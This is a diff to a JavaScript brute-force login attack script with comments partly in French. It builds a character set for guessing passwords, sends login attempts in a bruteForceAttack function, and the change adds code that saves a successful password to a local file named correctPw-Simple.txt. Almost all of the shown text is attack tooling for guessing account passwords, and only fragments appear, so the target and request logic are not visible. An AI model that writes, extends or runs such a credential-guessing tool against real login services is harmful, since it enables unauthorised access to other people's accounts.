@@ -9,6 +9,10 @@ const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
 const digits = '0123456789';
 const specials = '!@#$%^&*()_+[]{}|;:,.<>?';
 
+import path from 'path'
+import fs from 'fs'
+const fileName='correctPw-Simple.txt'
+
 const includeSpecials = true;  // Changez cette valeur à false si vous ne voulez pas inclure les caractères spéciaux
 
 let charset = lowercase + uppercase + digits;
@@ -32,6 +36,8 @@ async function bruteForceAttack(password) {
         // if response with status OK then return true and log the password
         if (response.ok) {
             console.log(chalk.green.bold(`Login Successfully Email: ${email}, Password: ${password} valid`));
+            fs.writeFileSync(path.resolve(fileName),password,'utf-8')
+
             return true;
         }
         // if response !== OK then return false with incorrect password
